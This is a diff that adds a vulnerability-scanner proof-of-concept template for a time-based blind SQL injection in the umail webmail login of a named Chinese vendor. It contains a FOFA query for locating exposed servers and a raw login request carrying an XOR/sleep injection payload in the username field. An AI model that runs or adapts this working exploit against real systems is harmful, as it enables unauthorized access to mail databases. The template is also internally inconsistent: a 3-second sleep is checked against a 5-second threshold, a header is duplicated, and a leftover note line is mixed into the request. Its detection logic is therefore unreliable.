@@ -1,0 +1,60 @@
+id: poc-hx0znffa0tgvth0e
+info:
+  name: 深圳市福洽科技有限公司umail系统index 存在sql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hx0znffa0tgvth0e
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hx0znffa0tgvth0e
+    fofa: body=”/webmail/static/script/cryptojs/rollups/aes.js”
+http:
+- raw:
+  - 'GET /webmail/index.php?module=view&action=login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
+
+    Connection: close
+
+    Accept-Encoding: gzip
+
+
+    2.domain=需要填写邮箱:'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /webmail/index.php?action=login&module=operate&web=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
+
+    Content-Length: 277
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Encoding: gzip,deflate
+
+    Connection: Keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: PHPSESSID=0mqip0k7nu5a9dbog305jgd4f5
+
+    X-Requested-With: XMLHttpRequest
+
+    domain=foryouce.com&enter=true&language=zh_TW&nonce=bd93560caca2246e201ec64d8ec8324c3bd3bb1317239445311Y723H944531&password=g00dPa%24%24w0rD&remuser=1&ssllgoin=1&stime=1723944531&token=e434030c3fa3159f863d6bb093a9d8f8&username=0''XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR''Z'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
